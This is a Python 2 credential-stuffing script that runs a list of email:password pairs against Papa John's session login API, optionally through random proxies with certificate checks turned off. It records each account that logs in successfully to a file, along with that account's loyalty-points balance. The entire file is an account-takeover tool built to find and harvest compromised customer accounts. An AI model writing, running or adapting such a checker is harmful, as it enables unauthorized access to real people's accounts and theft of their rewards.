# -*- coding: utf-8 -*-
import requests
import re
import Queue
import codecs
import time
import random
from threading import Thread

requests.packages.urllib3.disable_warnings()

with codecs.open('proxies.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
	

def check(q):
    while True:
		try:
			c = q.get()
			user = c.split(':')[0]
			passw = c.split(':')[1]
			work = False
			proxy = random.choice(proxies).strip()
			prozy = {
				'http': proxy,
				'https': proxy
			}
			s = requests.session()
			headers = {'Content-Type': 'application/json;charset=UTF-8'}
			r = s.post(
						'https://www.papajohns.com/api/v1/sessions',
						json={"email":user,"password":passw,"rememberMe":False},
						verify=False,
						headers=headers,
						timeout=7,
						#proxies=prozy
					)
			print r.text
			if 'customer' in r.text:
				work = True
				points = re.findall('pointsAvailable":(.*?),', r.text)
			if work:
				f = open("working.txt", "a")
				f.write('{0}:{1} - {2} points\n'.format(user, passw, points[0]))
				f.close()
				print user, 'works!'
			else:
				print user, 'does not work!'
			time.sleep(1.5)
			q.task_done()
		except Exception, e:
			print e
			proxy = random.choice(proxies)
    
def main():
    with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
        
    queue = Queue.Queue()
    
    for _ in range(int(1)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()